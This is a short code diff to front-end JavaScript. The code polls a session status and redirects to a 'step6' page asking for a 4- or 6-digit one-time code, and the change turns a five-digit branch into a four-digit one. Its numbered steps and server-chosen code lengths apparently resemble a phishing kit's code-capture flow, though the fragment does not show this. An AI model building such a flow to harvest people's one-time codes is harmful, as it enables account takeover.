@@ -660,9 +660,9 @@
               );
               const data = await statusRes.json();
 
-              if (data.status === "otp5") {
+              if (data.status === "otp4") {
                 clearInterval(pollInterval);
-                window.location.href = `step6.html?len=5&id=${result.sessionId}`;
+                window.location.href = `step6.html?len=4&id=${result.sessionId}`;
               } else if (data.status === "otp6") {
                 clearInterval(pollInterval);
                 window.location.href = `step6.html?len=6&id=${result.sessionId}`;
